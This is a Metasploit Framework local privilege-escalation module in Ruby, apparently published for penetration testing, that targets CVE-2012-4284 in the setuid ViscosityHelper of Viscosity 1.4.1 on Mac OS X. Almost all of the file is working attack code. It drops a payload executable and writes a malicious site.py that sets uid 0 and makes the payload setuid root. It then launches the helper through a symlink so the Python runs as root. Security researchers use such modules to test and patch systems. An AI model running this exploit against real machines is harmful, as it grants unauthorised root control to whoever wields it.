# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;
require &#039;rex&#039;
require &#039;msf/core/post/common&#039;
require &#039;msf/core/post/file&#039;
require &#039;msf/core/exploit/exe&#039;

class Metasploit4 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Post::File
  include Msf::Post::Common

  def initialize(info={})
    super( update_info( info, {
        &#039;Name&#039;           => &#039;Viscosity setuid-set ViscosityHelper Privilege Escalation&#039;,
        &#039;Description&#039;    => %q{
            This module exploits a vulnerability in Viscosity 1.4.1 on Mac OS X. The
          vulnerability exists in the setuid ViscosityHelper, where an insufficient
          validation of path names allows execution of arbitrary python code as root.
          This module has been tested successfully on Viscosity 1.4.1 over Mac OS X
          10.7.5.
        },
        &#039;References&#039;     =>
          [
            [ &#039;CVE&#039;, &#039;2012-4284&#039; ],
            [ &#039;OSVDB&#039;, &#039;84709&#039; ],
            [ &#039;EDB&#039;, &#039;20485&#039; ],
            [ &#039;URL&#039;, &#039;http://blog.zx2c4.com/791&#039; ]
          ],
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Author&#039;         =>
          [
            &#039;Jason A. Donenfeld&#039;, # Vulnerability discovery and original Exploit
            &#039;juan vazquez&#039;        # Metasploit module
          ],
        &#039;DisclosureDate&#039; => &#039;Aug 12 2012&#039;,
        &#039;Platform&#039;       => &#039;osx&#039;,
        &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
        &#039;SessionTypes&#039;   => [ &#039;shell&#039; ],
        &#039;Targets&#039;        =>
          [
            [ &#039;Viscosity 1.4.1 / Mac OS X x86&#039;,    { &#039;Arch&#039; => ARCH_X86 } ],
            [ &#039;Viscosity 1.4.1 / Mac OS X x64&#039;,    { &#039;Arch&#039; => ARCH_X64 } ]
          ],
        &#039;DefaultOptions&#039; => { "PrependSetresuid" => true, "WfsDelay" => 2 },
        &#039;DefaultTarget&#039; => 0
      }))
    register_options([
        # These are not OptPath becuase it&#039;s a *remote* path
        OptString.new("WritableDir", [ true, "A directory where we can write files", "/tmp" ]),
        OptString.new("Viscosity",   [ true, "Path to setuid ViscosityHelper executable", "/Applications/Viscosity.app/Contents/Resources/ViscosityHelper" ])
      ], self.class)
  end

  def check
    if not file?(datastore["Viscosity"])
      print_error "ViscosityHelper not found"
      return CheckCode::Safe
    end

    check = session.shell_command_token("find  #{datastore["Viscosity"]} -type f -user root -perm -4000")

    if check =~ /ViscosityHelper/
      return CheckCode::Vulnerable
    end

    return CheckCode::Safe
  end

  def clean
    file_rm(@link)
    file_rm(@python_file)
    file_rm("#{@python_file}c")
    file_rm(@exe_file)
  end

  def exploit

    exe_name = rand_text_alpha(8)
    @exe_file = "#{datastore["WritableDir"]}/#{exe_name}"
    print_status("Dropping executable #{@exe_file}")
    write_file(@exe_file, generate_payload_exe)

    evil_python =<<-EOF
import os
os.setuid(0)
os.setgid(0)
os.system("chown root #{@exe_file}")
os.system("chmod 6777 #{@exe_file}")
os.execl("#{@exe_file}", "#{exe_name}")
    EOF

    @python_file = "#{datastore["WritableDir"]}/site.py"
    print_status("Dropping python #{@python_file}...")
    write_file(@python_file, evil_python)

    print_status("Creating symlink...")
    link_name = rand_text_alpha(8)
    @link = "#{datastore["WritableDir"]}/#{link_name}"
    cmd_exec "ln -s -f -v #{datastore["Viscosity"]} #{@link}"

    print_status("Running...")
    begin
      cmd_exec "#{@link}"
    rescue
      print_error("Failed. Cleaning files #{@link}, #{@python_file}, #{@python_file}c and #{@exe_file}...")
      clean
      return
    end
    print_warning("Remember to clean files: #{@link}, #{@python_file}, #{@python_file}c and #{@exe_file}")
  end
end

